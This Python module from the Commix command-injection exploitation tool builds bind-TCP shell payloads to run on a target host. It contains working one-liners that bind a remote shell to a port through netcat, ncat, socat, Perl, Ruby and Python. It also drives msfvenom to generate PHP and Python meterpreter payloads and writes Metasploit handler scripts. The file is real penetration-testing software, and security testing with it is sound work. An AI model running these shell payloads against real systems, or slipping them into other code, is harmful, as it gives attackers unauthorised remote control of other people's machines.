#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
import re
import sys
import time
import base64
import subprocess
from src.utils import menu
from src.utils import common
from src.utils import settings
from src.thirdparty.six.moves import input as _input
from src.thirdparty.colorama import Fore, Back, Style, init

"""
Check for available shell options.
"""
def shell_options(option):
  if option.lower() == "bind_tcp":
    warn_msg = "You are into the '" + option.lower() + "' mode."
    print(settings.print_warning_msg(warn_msg))
  elif option.lower() == "?":
    menu.reverse_tcp_options()
  elif option.lower() == "quit" or option.lower() == "exit":
    raise SystemExit()
  elif option[0:4].lower() == "set ":
    if option[4:10].lower() == "rhost ":
      check_rhost(option[10:])
    if option[4:10].lower() == "lhost ":
      err_msg =  "The '" + option[4:9].upper() + "' option, is not "
      err_msg += "usable for 'bind_tcp' mode. Use 'RHOST' option."
      print(settings.print_error_msg(err_msg))
    if option[4:10].lower() == "lport ":
      check_lport(option[10:])
  else:
    return option

"""
Success msg.
"""
def shell_success():
  info_msg = "Everything is in place, cross your fingers and check for bind shell (on port " + settings.LPORT + ").\n"
  sys.stdout.write(settings.print_info_msg(info_msg))
  sys.stdout.flush()

"""
Error msg if the attack vector is available only for Windows targets.
"""
def windows_only_attack_vector():
    error_msg = "This attack vector is available only for Windows targets."
    print(settings.print_error_msg(error_msg))

"""
Message regarding the MSF handler.
"""
def msf_launch_msg(output):
    info_msg = "Type \"msfconsole -r " + os.path.abspath(output) + "\" (in a new window)."
    print(settings.print_info_msg(info_msg))
    info_msg = "Once the loading is done, press here any key to continue..."
    sys.stdout.write(settings.print_info_msg(info_msg))
    sys.stdin.readline().replace("\n", "")
    # Remove the ouput file.
    os.remove(output)

"""
Set up the PHP working directory on the target host.
"""
def set_php_working_dir():
  while True:
    message = "Do you want to use '" + settings.WIN_PHP_DIR
    message += "' as PHP working directory on the target host? [Y/n] > "
    php_dir = common.read_input(message, default="Y", check_batch=True)
    if php_dir in settings.CHOICE_YES:
      break
    elif php_dir in settings.CHOICE_NO:
      message = "Please provide a full path directory for Python interpreter (e.g. '"
      message += settings.WIN_PYTHON_INTERPRETER + "') or 'python'> "
      settings.WIN_PHP_DIR = common.read_input(message, default=None, check_batch=True)
      settings.USER_DEFINED_PHP_DIR = True
      break
    else:
      common.invalid_option(php_dir)
      pass

"""
Set up the Python working directory on the target host.
"""
def set_python_working_dir():
  while True:
    message = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER
    message += "' as Python interpreter on the target host? [Y/n] > "
    python_dir = common.read_input(message, default="Y", check_batch=True)
    if python_dir in settings.CHOICE_YES:
      break
    elif python_dir in settings.CHOICE_NO:
      message = "Please provide a full path directory for Python interpreter (e.g. '"
      message += "C:\\Python27\\python.exe') > "
      settings.WIN_PYTHON_INTERPRETER = common.read_input(message, default=None, check_batch=True)
      settings.USER_DEFINED_PYTHON_DIR = True
      break
    else:
      common.invalid_option(python_dir)
      pass

"""
Set up the Python interpreter on linux target host.
"""
def set_python_interpreter():
  while True:
    message = "Do you want to use '" + settings.LINUX_PYTHON_INTERPRETER
    message += "' as Python interpreter on the target host? [Y/n] > "
    python_interpreter = common.read_input(message, default="Y", check_batch=True)
    if python_interpreter in settings.CHOICE_YES:
      break
    elif python_interpreter in settings.CHOICE_NO:
      message = "Please provide a custom interpreter for Python (e.g. '"
      message += "python27') > "
      settings.LINUX_PYTHON_INTERPRETER = common.read_input(message, default=None, check_batch=True)
      settings.USER_DEFINED_PYTHON_INTERPRETER = True
      break
    else:
      common.invalid_option(python_interpreter)
      pass

"""
check / set rhost option for bind TCP connection
"""
def check_rhost(rhost):
  settings.RHOST = rhost
  print("RHOST => " + settings.RHOST)
  return True

"""
check / set lport option for bind TCP connection
"""
def check_lport(lport):
  try:
    if float(lport):
      settings.LPORT = lport
      print("LPORT => " + settings.LPORT)
      return True
  except ValueError:
    err_msg = "The provided port must be numeric (i.e. 1234)"
    print(settings.print_error_msg(err_msg))
    return False


"""
Set up the netcat bind TCP connection
"""
def netcat_version(separator):

  # Defined shell
  shell = "sh"

  # Netcat alternatives
  NETCAT_ALTERNATIVES = [
    "nc",
    "busybox nc",
    "nc.traditional",
    "nc.openbsd"
  ]

  while True:
    nc_version = _input("""""" + Style.BRIGHT + """Available netcat bind TCP shell options:""" + Style.RESET_ALL + """
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host.
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbsd on target host.
commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_netcat""" + Style.RESET_ALL + """) > """)

    # Default Netcat
    if nc_version == '1':
      nc_alternative = NETCAT_ALTERNATIVES[0]
      break
    # Netcat for Busybox
    if nc_version == '2':
      nc_alternative = NETCAT_ALTERNATIVES[1]
      break
    # Netcat-Traditional
    elif nc_version == '3':
      nc_alternative = NETCAT_ALTERNATIVES[2]
      break
    # Netcat-Openbsd (nc without -e)
    elif nc_version == '4':
      nc_alternative = NETCAT_ALTERNATIVES[3]
      break
    # Check for available shell options
    elif any(option in nc_version.lower() for option in settings.SHELL_OPTIONS):
      if shell_options(nc_version):
        return shell_options(nc_version)
    # Invalid command
    else:
      common.invalid_option(nc_version)
      continue

  while True:
    message = "Do you want to use '/bin' standard subdirectory? [y/N] > "
    enable_bin_dir = common.read_input(message, default="N", check_batch=True)
    if enable_bin_dir in settings.CHOICE_NO:
      break
    elif enable_bin_dir in settings.CHOICE_YES :
      nc_alternative = "/bin/" + nc_alternative
      shell = "/bin/" + shell
      break
    elif enable_bin_dir in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(enable_bin_dir)
      pass

  if nc_version != '4':
    # Netcat with -e
    cmd = nc_alternative + " -l -p " + settings.LPORT + " -e " + shell
  else:
    # nc without -e
    cmd = shell + " -c \"" + shell + " 0</tmp/f | " + \
           nc_alternative + " -l -p " + settings.LPORT + \
           " 1>/tmp/f\""

  return cmd

"""
"""
def other_bind_shells(separator):

  while True:
    other_shell = _input("""""" + Style.BRIGHT + """Available generic bind TCP shell options:""" + Style.RESET_ALL + """
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP bind TCP shell.
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl bind TCP shell.
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby bind TCP shell.
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python bind TCP shell.
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat bind TCP shell.
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Ncat bind TCP shell.
""" + Style.BRIGHT + """Available meterpreter bind TCP shell options:""" + Style.RESET_ALL + """
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a PHP meterpreter bind TCP shell.
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python meterpreter bind TCP shell.
commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + """) > """)

    # PHP-bind-shell
    if other_shell == '1':

      if not os.path.exists(settings.METASPLOIT_PATH):
        error_msg = settings.METASPLOIT_ERROR_MSG
        print(settings.print_error_msg(error_msg))
        continue

      payload = "php/bind_php"
      output = "php_bind_tcp.rc"

      info_msg = "Generating the '" + payload + "' payload. "
      sys.stdout.write(settings.print_info_msg(info_msg))
      sys.stdout.flush()
      try:
        proc = subprocess.Popen("msfvenom -p " + str(payload) +
          " RHOST=" + str(settings.RHOST) +
          " LPORT=" + str(settings.LPORT) +
          " -e php/base64 -o " + output + ">/dev/null 2>&1", shell=True).wait()

        with open (output, "r+") as content_file:
          data = content_file.readlines()
          data = ''.join(data).replace("\n",settings.SINGLE_WHITESPACE)

        print(settings.SINGLE_WHITESPACE)
        # Remove the ouput file.
        os.remove(output)
        with open(output, 'w+') as filewrite:
          filewrite.write("use exploit/multi/handler\n"
                          "set payload " + payload + "\n"
                          "set rhost "+ str(settings.RHOST) + "\n"
                          "set lport "+ str(settings.LPORT) + "\n"
                          "exploit\n\n")

        if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
          set_php_working_dir()
          other_shell = settings.WIN_PHP_DIR + " -r " + data
        else:
          other_shell = "php -r \"" + data + "\""
        msf_launch_msg(output)
      except:
        print(settings.SINGLE_WHITESPACE)

      break

    # Perl-bind-shell
    elif other_shell == '2':
      other_shell = "perl -MIO -e '" \
                    "$c=new IO::Socket::INET(LocalPort," + settings.LPORT + ",Reuse,1,Listen)->accept;" \
                    "$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"
      break

    # Ruby-bind-shell
    elif other_shell == '3':
      other_shell = "ruby -rsocket -e '" \
                    "s=TCPServer.new(" + settings.LPORT + ");" \
                    "c=s.accept;" \
                    "s.close;" \
                    "$stdin.reopen(c);" \
                    "$stdout.reopen(c);" \
                    "$stderr.reopen(c);" \
                    "$stdin.each_line{|l|l=l.strip;" \
                    "next if l.length==0;" \
                    "(IO.popen(l,\"rb\"){|fd| fd.each_line {|o| c.puts(o.strip)}})}'"
      break

    # Python-bind-shell
    elif other_shell == '4':
      other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c 'import pty,os,socket%0d" \
                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
                    "s.bind((\"\"," + settings.LPORT + "))%0d" \
                    "s.listen(1)%0d" \
                    "(rem, addr) = s.accept()%0d" \
                    "os.dup2(rem.fileno(),0)%0d" \
                    "os.dup2(rem.fileno(),1)%0d" \
                    "os.dup2(rem.fileno(),2)%0d" \
                    "pty.spawn(\"/bin/sh\")%0d" \
                    "s.close()'"
      break

    # Socat-bind-shell
    elif other_shell == '5':
      other_shell = "socat tcp-listen:" + settings.LPORT + \
                    " exec:\"sh\""
      break

    # Ncat-bind-shell
    elif other_shell == '6':
      other_shell = "ncat -k -l " + settings.LPORT + " -e /bin/sh"
      break

    # PHP-bind-shell(meterpreter)
    elif other_shell == '7':

      if not os.path.exists(settings.METASPLOIT_PATH):
        error_msg = settings.METASPLOIT_ERROR_MSG
        print(settings.print_error_msg(error_msg))
        continue

      payload = "php/meterpreter/bind_tcp"
      output = "php_meterpreter.rc"

      info_msg = "Generating the '" + payload + "' payload. "
      sys.stdout.write(settings.print_info_msg(info_msg))
      sys.stdout.flush()
      try:
        proc = subprocess.Popen("msfvenom -p " + str(payload) +
          " RHOST=" + str(settings.RHOST) +
          " LPORT=" + str(settings.LPORT) +
          " -e php/base64 -o " + output + ">/dev/null 2>&1", shell=True).wait()

        with open (output, "r+") as content_file:
          data = content_file.readlines()
          data = ''.join(data).replace("\n",settings.SINGLE_WHITESPACE)

        print(settings.SINGLE_WHITESPACE)
        # Remove the ouput file.
        os.remove(output)
        with open(output, 'w+') as filewrite:
          filewrite.write("use exploit/multi/handler\n"
                          "set payload " + payload + "\n"
                          "set rhost "+ str(settings.RHOST) + "\n"
                          "set lport "+ str(settings.LPORT) + "\n"
                          "exploit\n\n")

        if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
          set_php_working_dir()
          other_shell = settings.WIN_PHP_DIR + " -r " + data
        else:
          other_shell = "php -r \"" + data + "\""
        msf_launch_msg(output)
      except:
        print(settings.SINGLE_WHITESPACE)
      break

    # Python-bind-shell(meterpreter)
    elif other_shell == '8':

      if not os.path.exists(settings.METASPLOIT_PATH):
        error_msg = settings.METASPLOIT_ERROR_MSG
        print(settings.print_error_msg(error_msg))
        continue

      payload = "python/meterpreter/bind_tcp"
      output = "py_meterpreter.rc"

      info_msg = "Generating the '" + payload + "' payload. "
      sys.stdout.write(settings.print_info_msg(info_msg))
      sys.stdout.flush()
      try:
        proc = subprocess.Popen("msfvenom -p " + str(payload) +
          " RHOST=" + str(settings.RHOST) +
          " LPORT=" + str(settings.LPORT) +
          " -o " + output + ">/dev/null 2>&1", shell=True).wait()

        with open (output, "r") as content_file:
          data = content_file.readlines()
          data = ''.join(data)
          #data = base64.b64encode(data.encode(settings.DEFAULT_CODEC)).decode()

        print(settings.SINGLE_WHITESPACE)
        # Remove the ouput file.
        os.remove(output)
        with open(output, 'w+') as filewrite:
          filewrite.write("use exploit/multi/handler\n"
                          "set payload " + payload + "\n"
                          "set rhost "+ str(settings.RHOST) + "\n"
                          "set lport "+ str(settings.LPORT) + "\n"
                          "exploit\n\n")

        if settings.TARGET_OS == settings.OS.WINDOWS:
          if not settings.USER_DEFINED_PYTHON_DIR:
            set_python_working_dir()
          other_shell = settings.WIN_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
        else:
          if not settings.USER_DEFINED_PYTHON_INTERPRETER:
            set_python_interpreter()
          other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
        msf_launch_msg(output)
      except:
        print(settings.SINGLE_WHITESPACE)
      break
    # Check for available shell options
    elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
      if shell_options(other_shell):
        return shell_options(other_shell)
    # Invalid option
    else:
      common.invalid_option(other_shell)
      continue

  return other_shell

"""
Choose type of bind TCP connection.
"""
def bind_tcp_options(separator):

  while True:
    bind_tcp_option = _input("""""" + Style.BRIGHT + """Available bind TCP shell options:""" + Style.RESET_ALL + """
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' for netcat bind TCP shells.
""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other bind TCP shells.
commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp""" + Style.RESET_ALL + """) > """)

    if bind_tcp_option.lower() == "bind_tcp":
      warn_msg = "You are into the '" + bind_tcp_option.lower() + "' mode."
      print(settings.print_warning_msg(warn_msg))
      continue

    # Option 1 - Netcat shell
    elif bind_tcp_option == '1' :
      bind_tcp_option = netcat_version(separator)
      if bind_tcp_option.lower() not in settings.SHELL_OPTIONS:
        shell_success()
        break
      elif bind_tcp_option.lower() in settings.SHELL_OPTIONS:
        return bind_tcp_option
      else:
        pass
    # Option 2 - Other (Netcat-Without-Netcat) shells
    elif bind_tcp_option == '2' :
      bind_tcp_option = other_bind_shells(separator)
      if bind_tcp_option.lower() not in settings.SHELL_OPTIONS:
        shell_success()
        break
    # Check for available shell options
    elif any(option in bind_tcp_option.lower() for option in settings.SHELL_OPTIONS):
      if shell_options(bind_tcp_option):
        return shell_options(bind_tcp_option)
    # Invalid option
    else:
      common.invalid_option(bind_tcp_option)
      continue


  return bind_tcp_option

"""
Set up the bind TCP connection
"""
def configure_bind_tcp(separator):
  # Set up rhost for the bind TCP connection
  while True:
    sys.stdout.write(settings.BIND_TCP_SHELL)
    option = _input()
    if option.lower() == "bind_tcp":
      warn_msg = "You are into the '" + option.lower() + "' mode."
      print(settings.print_warning_msg(warn_msg))
      continue
    elif option.lower() == "?":
      menu.bind_tcp_options()
      continue
    elif option.lower() == "quit" or option.lower() == "exit":
      raise SystemExit()
    elif option.lower() == "os_shell" or option.lower() == "back":
      settings.BIND_TCP = False
      break
    elif option.lower() == "reverse_tcp":
      settings.REVERSE_TCP = True
      settings.BIND_TCP = False
      break
    elif len(settings.LPORT) != 0 and len(settings.RHOST) != 0:
      break
    elif option[0:4].lower() == "set ":
      if option[4:10].lower() == "rhost ":
        if check_rhost(option[10:]):
          if len(settings.LPORT) == 0:
            pass
          else:
            break
        else:
          continue
      elif option[4:10].lower() == "lhost ":
        err_msg =  "The '" + option[4:9].upper() + "' option, is not "
        err_msg += "usable for 'bind_tcp' mode. Use 'RHOST' option."
        print(settings.print_error_msg(err_msg))
        continue
      elif option[4:10].lower() == "lport ":
        if check_lport(option[10:]):
          if len(settings.RHOST) == 0:
            pass
          else:
            break
        else:
          continue
      else:
        common.invalid_option(option)
        pass
    else:
      common.invalid_option(option)
      pass

# eof